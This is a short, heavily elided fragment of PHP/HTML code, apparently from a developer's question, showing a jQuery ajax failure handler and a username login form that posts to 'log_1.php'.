...
?>
  ...
  $.ajax({
    ...
    fail: function(resp, status, xhr) {
        ...
        <br>
        <form id="login_form" align="center" method="post" action="./log_1.php" autocomplete="off">
            <br>
...
onfocus="this.removeAttribute('readonly');" placeholder="Enter your Username " required >
        ...
        <br>
            ...
            <a href="./log_1.php"><input type="Submit" id="submit_next_button" class="btn" name="next" value="Next"></a>
        </form>
        <br>
        <br>
